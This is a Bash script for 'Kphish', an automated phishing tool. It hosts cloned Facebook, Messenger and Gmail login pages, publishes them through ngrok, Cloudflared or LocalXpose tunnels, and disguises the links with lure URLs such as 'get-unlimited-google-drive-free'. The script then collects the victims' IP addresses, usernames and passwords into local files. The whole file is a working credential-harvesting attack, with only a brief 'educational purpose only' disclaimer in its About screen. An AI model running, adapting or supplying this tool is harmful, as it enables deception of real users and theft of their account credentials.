#!/bin/bash

##   Kphish     	: 	Automated Phishing Tool
##   Author      	: 	MD Asif Hasan
##   Version     	: 	2.0
##   Github      	: 	https://github.com/DetaSploit/Kphish



##
##      Copyright (C) 2022  MD Asif Hasan (https://github.com/DetaSploit/Kphish)
##



__version__="2.0"

## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Directories - MD Asif Hasan
if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi

if [[ ! -d "auth" ]]; then
	mkdir -p "auth"
fi

if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi

## Remove logfile - MD Asif Hasan
if [[ -e ".server/.loclx" ]]; then
	rm -rf ".server/.loclx"
fi

if [[ -e ".server/.cld.log" ]]; then
	rm -rf ".server/.cld.log"
fi

## Script termination
exit_on_signal_SIGINT() {
	{ printf "\n\n%s\n\n" "${WHITE}[${GREEN}!${WHITE}]${BLUE} Program Interrupted." 2>&1; reset_color; }
	exit 0
}

exit_on_signal_SIGTERM() {
	{ printf "\n\n%s\n\n" "${WHITE}[${GREEN}!${WHITE}]${BLUE} Program Terminated." 2>&1; reset_color; }
	exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
	return
}

## Kill already running process
kill_pid() {
	check_PID="php ngrok cloudflared loclx"
	for process in ${check_PID}; do
		if [[ $(pidof ${process}) ]]; then # Check for Process
			killall ${process} > /dev/null 2>&1 # Kill the Process
		fi
	done
}

## Banner
banner() {
	cat <<- EOF

		${GREEN}
		  _  __      _     _     _     
		 | |/ /     | |   (_)   | |    
		 | ' / _ __ | |__  _ ___| |__  
		 |  < | '_ \| '_ \| / __| '_ \ 
		 | . \| |_) | | | | \__ \ | | |
		 |_|\_\ .__/|_| |_|_|___/_| |_|
		      | |                      
		      |_|                      
		${GREEN}
		                                    ${BLUE}Version : ${__version__}

		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by MD Asif Hasan (DetaSploit)${WHITE}
	EOF
}

## Small Banner
banner_small() {
	cat <<- EOF
	
		${GREEN}
		  _  __      _     _     _     
		 | |/ /     | |   (_)   | |    
		 | ' / _ __ | |__  _ ___| |__  
		 |  < | '_ \| '_ \| / __| '_ \ 
		 | . \| |_) | | | | \__ \ | | |
		 |_|\_\ .__/|_| |_|_|___/_| |_|
		      | |                      
		      |_|                      
		${GREEN}
		                                    ${BLUE}Version : ${__version__}

		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by MD Asif Hasan (DetaSploit)${WHITE}
	EOF
}

## Dependencies
dependencies() {
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."

	if [[ -d "/data/data/com.termux/files/home" ]]; then
		if [[ ! $(command -v proot) ]]; then
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
			pkg install proot resolv-conf -y
		fi

		if [[ ! $(command -v tput) ]]; then
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
			pkg install ncurses-utils -y
		fi
	fi

	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
	else
		pkgs=(php curl unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
				if [[ $(command -v pkg) ]]; then
					pkg install "$pkg" -y
				elif [[ $(command -v apt) ]]; then
					sudo apt install "$pkg" -y
				elif [[ $(command -v apt-get) ]]; then
					sudo apt-get install "$pkg" -y
				elif [[ $(command -v pacman) ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ $(command -v dnf) ]]; then
					sudo dnf -y install "$pkg"
				elif [[ $(command -v yum) ]]; then
					sudo yum -y install "$pkg"
				else
					echo -e "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Unsupported package manager, Install packages manually."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi
}

# Download Binaries
download() {
	url="$1"
	output="$2"
	file=`basename $url`
	if [[ -e "$file" || -e "$output" ]]; then
		rm -rf "$file" "$output"
	fi
	curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"

	if [[ -e "$file" ]]; then
		if [[ ${file#*.} == "zip" ]]; then
			unzip -qq $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		elif [[ ${file#*.} == "tgz" ]]; then
			tar -zxf $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		else
			mv -f $file .server/$output > /dev/null 2>&1
		fi
		chmod +x .server/$output > /dev/null 2>&1
		rm -rf "$file"
	else
		echo -e "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Error occured while downloading ${output}."
		{ reset_color; exit 1; }
	fi
}

## Install ngrok
install_ngrok() {
	if [[ -e ".server/ngrok" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz' 'ngrok'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz' 'ngrok'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz' 'ngrok'
		else
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.tgz' 'ngrok'
		fi
	fi
}

## Install Cloudflared
install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
		else
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
		fi
	fi
}

## Install LocalXpose
install_localxpose() {
	if [[ -e ".server/loclx" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
		else
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
		fi
	fi
}

## Exit message
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
	{ reset_color; exit 0; }
}

## About
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN} Author   ${RED}:  ${ORANGE}MD Asif Hasan ${RED}[ ${ORANGE}DetaSploit ${RED}]
		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/DetaSploit/Kphish
		${GREEN} Social   ${RED}:  ${CYAN}https://facebook.com/DetaSploit
		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}

		${WHITE} ${REDBG}Warning:${RESETBG}
		${CYAN}  This Tool is made for educational purpose 
		  only ${RED}!${WHITE}${CYAN} Author will not be responsible for 
		  any misuse of this toolkit ${RED}!${WHITE}
		

		${WHITE}[${GREEN}00${WHITE}]${BLUE} Main Menu     ${WHITE}[${GREEN}99${WHITE}]${BLUE} Exit

	EOF

	read -p "${GREEN}[${ORANGE}•${GREEN}]${BLUE} Select Option : ${BLUE}"
	case $REPLY in 
		99)
			msg_exit;;
		0 | 00)
			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
			{ sleep 1; main_menu; };;
		*)
			echo -ne "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Invalid Option, Try Again..."
			{ sleep 1; about; };;
	esac
}

## Setup website and start php server
HOST='127.0.0.1'
PORT='8080'

setup_site() {
	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Setting up server..."${WHITE}
	cp -rf sites/"$website"/* .server/www
	cp -f  sites/ip.php .server/www/
	echo -ne "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Starting PHP server..."${WHITE}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
}

## Get IP address
capture_ip() {
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	echo -e "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Victim's IP : ${BLUE}$IP"
	echo -ne "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
	cat .server/www/ip.txt >> auth/ip.txt
}

## Get credentials
capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
	IFS=$'\n'
	echo -e "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Account : ${ORANGE}$ACCOUNT"
	echo -e "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Password: ${ORANGE}$PASSWORD"
	echo -e "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
	cat .server/www/usernames.txt >> auth/usernames.dat
	echo -ne "\n${RED}[${ORANGE}•${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to Exit. "
}

## Print data
capture_data() {
	echo -ne "\n${RED}[${ORANGE}•${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to Exit."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Victim IP Found!"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Login info Found!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

## Start ngrok
start_ngrok() {
	echo -e "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -e "\n"
	read -n1 -p "${RED}[${ORANGE}•${RED}]${ORANGE} Change Ngrok Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
	[[ ${opinion,,} == "y" ]] && ngrok_region="eu" || ngrok_region="us"
	echo -e "\n\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Launching Ngrok..."

	if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.server/ngrok http --region ${ngrok_region} "$HOST":"$PORT" --log=stdout > /dev/null 2>&1 &
	else
		sleep 2 && ./.server/ngrok http --region ${ngrok_region} "$HOST":"$PORT" --log=stdout > /dev/null 2>&1 &
	fi

	{ sleep 8; clear; banner_small; }
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
	ngrok_url1=${ngrok_url#https://}
	echo -e "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Ngrok Url : ${ORANGE}$ngrok_url"
	echo -e "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Masked Url : ${ORANGE}$mask@$ngrok_url1"
	capture_data
}

## Start Cloudflared
start_cloudflared() { 
    rm .cld.log > /dev/null 2>&1 &
	echo -e "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Initializing... ${ORANGE}( ${CYAN}http://$HOST:$PORT ${ORANGE})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Launching Cloudflared..."

	if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	else
		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	fi

	{ sleep 8; clear; banner_small; }
	
	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
	cldflr_link1=${cldflr_link#https://}
	echo -e "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Cloudflared Url : ${ORANGE}$cldflr_link"
	echo -e "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Masked Url : ${ORANGE}$mask@$cldflr_link1"
	capture_data
}

localxpose_auth() {
	./.server/loclx -help > /dev/null 2>&1 &
	sleep 1
	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 

	[ "$(./.server/loclx account status | grep Error)" ] && {
		echo -e "\n\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Create an Account on ${ORANGE}Localxpose.io${GREEN} & Copy the Token\n"
		sleep 3
		read -p "${GREEN}[${ORANGE}•${GREEN}]${BLUE} Input Loclx Token :${ORANGE} " loclx_token
		[[ $loclx_token == "" ]] && {
			echo -e "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} You Have to Input Localxpose Token." ; sleep 2 ; tunnel_menu
		} || {
			echo -n "$loclx_token" > $auth_f 2> /dev/null
		}
	}
}

## Start LocalXpose (Again...)
start_loclx() {
	echo -e "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Initializing... ${CYAN}( ${ORANGE}http://$HOST:$PORT ${CYAN})"
	{ sleep 1; setup_site; localxpose_auth; }
	echo -e "\n"
	read -n1 -p "${GREEN}[${ORANGE}•${GREEN}]${BLUE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
	echo -e "\n\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Launching LocalXpose..."

	if [[ `command -v termux-chroot` ]]; then
		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
	else
		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
	fi

	{ sleep 12; clear; banner_small; }
	loclx_url=$(cat .server/.loclx | grep -Eo '[-0-9a-z]+.[-0-9a-z]+(.loclx.io)') # Somebody fix this crappy regex :(
	echo -e "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Loclx Url : ${ORANGE}http://$loclx_url"
	echo -e "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Masked Url : ${ORANGE}$mask@$loclx_url"
	capture_data
}

## Start localhost
start_localhost() {
	echo -e "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Initializing... ${GREEN}( ${ORANGE}http://$HOST:$PORT ${GREEN})"
	setup_site
	{ sleep 1; clear; banner_small; }
	echo -e "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Successfully Hosted at : ${GREEN}${ORANGE}http://$HOST:$PORT ${GREEN}"
	capture_data
}

## Tunnel selection
tunnel_menu() {
	{ clear; banner_small; }
	cat <<- EOF

		${GREEN}[${ORANGE}•${GREEN}]${BLUE} Localhost―――1
		${GREEN}[${ORANGE}•${GREEN}]${BLUE} Ngrok―――2     ${GREEN}[${ORANGE}Account Needed${GREEN}]
		${GREEN}[${ORANGE}•${GREEN}]${BLUE} Cloudflared―――3  ${GREEN}[${ORANGE}Auto Detects${GREEN}]
		${GREEN}[${ORANGE}•${GREEN}]${BLUE} LocalXpose―――4   ${GREEN}[${ORANGE}NEW! Max 15Min${GREEN}]

	EOF

	read -p "${GREEN}[${ORANGE}•${GREEN}]${RED} Select Port Forwarding Service : ${RED}"

	case $REPLY in 
		1 | 01)
			start_localhost;;
		2 | 02)
			start_ngrok;;
		3 | 03)
			start_cloudflared;;
		4 | 04)
			start_loclx;;
		*)
			echo -ne "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Invalid Option, Try Again..."
			{ sleep 1; tunnel_menu; };;
	esac
}

## Facebook
site_facebook() {
	cat <<- EOF

		${GREEN}[${ORANGE}1${GREEN}]${BLUE} Facebook Login Page
		${GREEN}[${ORANGE}2${GREEN}]${BLUE} Messenger Login Page

	EOF

	read -p "${GREEN}[${ORANGE}•${GREEN}]${RED} Select Option : ${RED}"

	case $REPLY in 
		1 | 01)
			website="facebook"
			mask='http://blue-verified-badge-for-facebook-free'
			tunnel_menu;;
		2 | 02)
			website="fb_messenger"
			mask='http://get-messenger-premium-features-free'
			tunnel_menu;;
		*)
			echo -ne "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_facebook; };;
	esac
}



## Gmail/Google
site_gmail() {
	cat <<- EOF

		${GREEN}[${ORANGE}1${GREEN}]${BLUE} Gmail Old Login Page
		${GREEN}[${ORANGE}2${GREEN}]${BLUE} Gmail New Login Page

	EOF

	read -p "${GREEN}[${ORANGE}•${GREEN}]${RED} Select Option : ${RED}"

	case $REPLY in 
		1 | 01)
			website="google"
			mask='http://get-unlimited-google-drive-free'
			tunnel_menu;;		
		2 | 02)
			website="google_new"
			mask='http://get-unlimited-google-drive-free'
			tunnel_menu;;
		*)
			echo -ne "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_gmail; };;
	esac
}



## Menu
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${ORANGE}Kphish :${BLUE} Simple Facebook & Gmail Phishing Tool

		${GREEN}[${ORANGE}•${GREEN}]${RED} Phishing Sites :

		${GREEN}[${ORANGE}•${GREEN}]${BLUE} Facebook―――1
		${GREEN}[${ORANGE}•${GREEN}]${BLUE} Gmail―――2
		${GREEN}[${ORANGE}•${GREEN}]${BLUE} About―――3
		${GREEN}[${ORANGE}•${GREEN}]${BLUE} Exit―――4

	EOF
	
	read -p "${GREEN}[${ORANGE}•${GREEN}]${RED} Select Option : ${RED}"

	case $REPLY in 
		1 | 01)
			site_facebook;;
		2 | 02)
			site_gmail;;


		3 | 03)
			about;;
		4 | 04)
			msg_exit;;
		*)
			echo -ne "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Invalid Option, Try Again..."
			{ sleep 1; main_menu; };;
	
	esac
}

## Main
kill_pid
dependencies
install_ngrok
install_cloudflared
install_localxpose
main_menu
